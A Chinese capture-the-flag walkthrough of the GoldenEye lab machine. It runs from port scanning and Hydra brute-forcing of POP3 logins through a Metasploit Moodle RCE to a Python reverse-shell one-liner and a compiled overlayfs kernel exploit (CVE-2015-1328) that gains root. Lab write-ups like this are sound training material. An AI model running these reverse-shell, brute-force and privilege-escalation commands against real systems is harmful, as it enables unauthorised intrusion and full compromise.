1、扫描挖掘本地的IP地址信息：
nmap -sS -sV -T5 -A 192.168.4.202
发现开放了25、80端口！

2、访问：http://192.168.4.202/，显示的文本提示了一条线索，它说进入到/sev-home/目录中。 
User: UNKNOWN
Naviagate to /sev-home/ to login 
需要登录，开始枚举查找用户名密码信息！


3、在 http://192.168.4.202/页面查看源代码：  <script src="terminal.js"></script>
访问：view-source:http://192.168.4.202/terminal.js
获得用户名：Boris、Natalya
获得密码：&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
Burpsuiter解密HTML：InvincibleHack3r
最终账号密码：boris/InvincibleHack3r


4、http://192.168.4.202/sev-home/ 登录后进行信息枚举：F12调试界面发现信息
1）is very effective, we have configured our pop3 service to run on a very high non-default port
谷歌翻译：非常有效，我们已将 pop3 服务配置为在非常高的非默认端口上运行
2）Qualified GoldenEye Network Operator Supervisors: 合格的 GoldenEye 网络运营商主管
Natalya
Boris

5、从上面的消息中，我们可以了解到某个非默认端口上正在运行一个活动的POP3服务，进行nmap全端口扫描：
nmap -p- 192.168.4.202  (-p-：全端口扫描   -p3306：仅仅扫描3306端口)

55006/tcp open  unknown
55007/tcp open  unknown
发现55006，55007两个开放的端口，扫描端口开启的服务详细信息：
nmap -sS -sV -T5 -A -p55006,55007 192.168.4.202 

6、访问http://192.168.4.202:55007/
---------------------------------------------------------------------------------
PORT      STATE SERVICE     VERSION
55006/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
|_ssl-date: TLS randomness does not represent time
55007/tcp open  unknown
MAC Address: 00:0C:29:6A:D0:D6 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:
-------------------------------------------------------------------------------
这段信息看出这两个端口开放了pop3的mail服务的，通过http://192.168.4.202/terminal.js页面，在注释中发现一条内容，指出目标系统正在使用默认密码。//Boris, make sure you update your default password. 

7、接下来尝试使用暴力破解，在上一步中找到的用户名“boris”，通过Hydra暴力破解pop3服务：

echo -e 'natalya\nboris' > dayu.txt   ---将两个用户名写入txt文本中
hydra -L dayu.txt -P /usr/share/wordlists/fasttrack.txt 192.168.4.202 -s 55007 pop3

经过2~5分钟等待，获得两组账号密码：
[55007][pop3] host: 192.168.4.202   login: natalya   password: bird
[55007][pop3] host: 192.168.4.202   login: boris   password: secret1!
用户：boris 密码：secret1!
用户：natalya 密码：bird

8、通过NC登录pop3查看邮件信封内容枚举：
nc 192.168.4.202 55007     ---登录邮箱
user boris                 ---登录用户
pass secret1!              ---登录密码
list                       ---查看邮件数量
retr 1~3                   ---查看邮件内容

第二封来自用户“natalya”，称她可以破坏鲍里斯的密码。
第三封邮件可以看出有一份文件用了GoldenEye的访问代码作为附件进行发送，并保留在根目录中。但我们无法从此处阅读附件。

natalya用户登录邮件查看信息：
nc 192.168.4.202 55007     ---登录邮箱
user natalya               ---登录用户
pass bird                  ---登录密码
list                       ---查看邮件数量
retr 1~3                   ---查看邮件内容
----------------------------------------------------------------------------------------
两封邮件：第一封邮件：
娜塔莉亚，请你停止破解鲍里斯的密码。 此外，您是 GNO 培训主管。 一旦学生被指定给你，我就会给你发电子邮件。
此外，请注意可能的网络漏洞。 我们获悉，一个名为 Janus 的犯罪集团正在追捕 GoldenEye。

第二封邮件：
好的 Natalyn 我有一个新学生给你。 由于这是一个新系统，如果您看到任何配置问题，请告诉我或鲍里斯，尤其是它与安全有关的问题……即使不是，也只需以“安全”为幌子输入……它就会 轻松升级变更单:)
好的，用户信用是：
用户名：xenia
密码：RCP90rulez！
鲍里斯验证了她是一个有效的承包商，所以只需创建帐户好吗？
如果您没有外部内部域的 URL：severnaya-station.com/gnocertdir
**请务必编辑您的主机文件，因为您通常在远程离线工作....
由于您是 Linux 用户，因此只需将此服务器 IP 指向 /etc/hosts 中的 severnaya-station.com。
----------------------------------------------------------------------------------------
在第二封邮件看到了另外一个用户名密码，此服务器域名和网站，还要求我们在本地服务hosts中添加域名信息：
用户名：xenia
密码：RCP90rulez!
域：severnaya-station.com
网址：severnaya-station.com/gnocertdir
我们现根据邮件提示添加本地域名：severnaya-station.com

9、设置本地HOSTS文件
gedit /etc/hosts
192.168.4.202 severnaya-station.com

10、访问severnaya-station.com/gnocertdir地址：

刚登陆界面我就看到了moodle，这是一个开源的CMS系统，继续点一点，发现要登陆，使用邮件获得的用户密码进行登陆。
whatweb severnaya-station.com/gnocertdir  ---指纹搜索也行

点击：Intro to GoldenEye可以进行登录，使用natalya邮箱第二封邮件获得的用户名密码登录：
用户名：xenia
密码：RCP90rulez!
Home / ▶ My profile / ▶ Messages --->发现有一封邮件，内容发现用户名doak

11、继续爆破用户名doak的邮件
echo doak > dayu.txt   ---将用户名写入txt文本中
hydra -L dayu.txt -P /usr/share/wordlists/fasttrack.txt 192.168.4.202 -s 55007 pop3 

[55007][pop3] host: 192.168.4.202   login: doak   password: goat
获得用户名密码：doak/goat

12、登录doak用户枚举邮件信息
nc 192.168.4.202 55007     ---登录邮箱
user doak                  ---登录用户
pass goat                  ---登录密码
list                       ---查看邮件数量
retr 1                     ---查看邮件内容

邮件消息说，为我们提供了更多登录凭据以登录到应用程序。让我们尝试使用这些凭据登录。
用户名：dr_doak
密码：4England!


13、使用新的账户密码登录CMS
登录后在：Home / ▶ My home 右边发现： s3cret.txt
另外发现这是Moodle使用的2.2.3版本

Something juicy is located here: /dir007key/for-007.jpg
现在我们查看文件的内容，指出管理员凭据已隐藏在映像文件中，让我们在浏览器中打开图像以查看其内容。

14、访问页面：severnaya-station.com/dir007key/for-007.jpg

下载到本地：
wget http://severnaya-station.com/dir007key/for-007.jpg

根据邮件提示让我们检查图片内容，下载图片后，我们可以使用：
binwalk（路由逆向分析工具）
exiftool（图虫）
strings（识别动态库版本指令）
等查看jpg文件底层内容！

exiftool for-007.jpg
strings for-007.jpg
用以上命令都可以查看到base64编码隐藏信息：eFdpbnRlcjE5OTV4IQ==

使用Burpsuite破解获得密码：xWinter1995x!

线索中说，这是管理员用户的密码。管理员用户身份继续登陆应用程序。
用户名：admin
密码：xWinter1995x!
severnaya-station.com/gnocertdir

进去内容太多了，花了很多时间查看，图片红框显示和我前面使用dr_doak用户登陆邮箱发现的结果一致。
这是Moodle使用的2.2.3版本，搜索了网上的可用漏洞。

Moodle 2.2.3 exp cve   --> CVE-2013-3630 漏洞可利用！ 29324


15、此版本有许多漏洞利用，由于我们需要在目标计算机上进行外壳访问，因此我选择使用远程代码执行（RCE）漏洞利用。

使用我们的神器：MSF

msfconsole                        ---进入MSF框架攻击界面
search moodle                     ---查找 moodle类型 攻击的模块
use 0                             ---调用0  exploit/multi/http/moodle_cmd_exec调用攻击脚本
set username admin                ---设置用户名：admin
set password xWinter1995x!        ---设置密码：xWinter1995x!
set rhost severnaya-station.com   ---设置：rhosts severnaya-station.com
set targeturi /gnocertdir         ---设置目录： /gnocertdir
set payload cmd/unix/reverse      ---设置payload：cmd/unix/reverse
set lhost 192.168.4.231           ---设置：lhost 192.168.4.231（需要本地IP）
exploit  ----执行命令

use exploit/multi/http/moodle_cmd_exec
msf exploit(moodle_cmd_exec) > set rhost severnaya-station.com
msf exploit(moodle_cmd_exec) > set targeturi /gnocertdir
msf exploit(moodle_cmd_exec) > set username admin
msf exploit(moodle_cmd_exec) > set password xWinter1995x!

当我们执行后发现无法成功，是因为对方需要修改执行PSpellShell
https://www.exploit-db.com/exploits/29324
's_editor_tinymce_spellengine' => 'PSpellShell',


由于我们已经使用了管理员admin用户登录页面，由于使用的是powershell命令，需要在设置中修改：
Home / ▶ Site administration / ▶ Plugins / ▶ Text editors / ▶ TinyMCE HTML editor
来到此处，修改PSpellShell然后save！

然后重新exploit继续运行：获得shell

执行tty，因为获得的权限无框架：执行
python -c 'import pty; pty.spawn("/bin/bash")'     ---将shell进行tty

15、python反弹shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.211.55.28",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'



16、内核提权
uname -a 查看权限！
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux

谷歌搜索：Linux ubuntu 3.13.0-32 exploit
获得exp版本：37292
--------------------------------------------------
CVE(CAN) ID: CVE-2015-1328

overlayfs文件系统是一种叠合式文件系统，实现了在底层文件系统上叠加另一个文件系统。Linux 内核3.18开始已经加入了对overlayfs的支持。Ubuntu Linux内核在更早的版本就已加入该支持。

Ubuntu Linux内核的overlayfs文件系统实现中存在一个权限检查漏洞，本地普通用户可以获取管理员权限。此漏洞影响所有目前官方支持的Ubuntu Linux版本，目前已经发布攻击代码，建议受影响用户尽快进行升级。

此漏洞源于overlayfs文件系统在上层文件系统目录中创建新文件时没有正确检查文件权限。它只检查了被修改文件的属主是否有权限在上层文件系统目录写入，导致当从底层文件系统目录中拷贝一个文件到上层文件系统目录时，文件属性也随同拷贝过去。如果Linux内核设置了CONFIG_USER_NS=y和FS_USERNS_MOUNT标志，将允许一个普通用户在低权限用户命名空间中mout一个overlayfs文件系统。本地普通用户可以利用该漏洞在敏感系统目录中创建新文件或读取敏感文件内容，从而提升到管理员权限。

---------------------------------------------------------------------------

kali搜索下：
searchsploit 37292        ---搜索kali本地的exp库中37292攻击脚本信息
cp /usr/share/exploitdb/exploits/linux/local/37292.c /root/桌面/   ---目录自行修改

这个靶场在枚举信息知道：
无法进行GCC编译，需要改下脚本为cc
gedit 37292.c       ---文本打开 
第143行将gcc改为cc    ---编写下 

然后在本目录下开启http服务：python -m SimpleHTTPServer 8081

wget http://192.168.4.222:8081/37292.c   ---wget下载http服务下的文件

成功下载后执行cc编译：
cc -o exp 37292.c     ---C语言的CC代码编译点c文件
chmod +x exp          ---编译成可执行文件，并赋权
./exp                 ---点杠执行

id                   ---查看目前权限
cat /root/.flag.txt  ---读取root下的flag信息
568628e0d993b1973adc718237da6e93














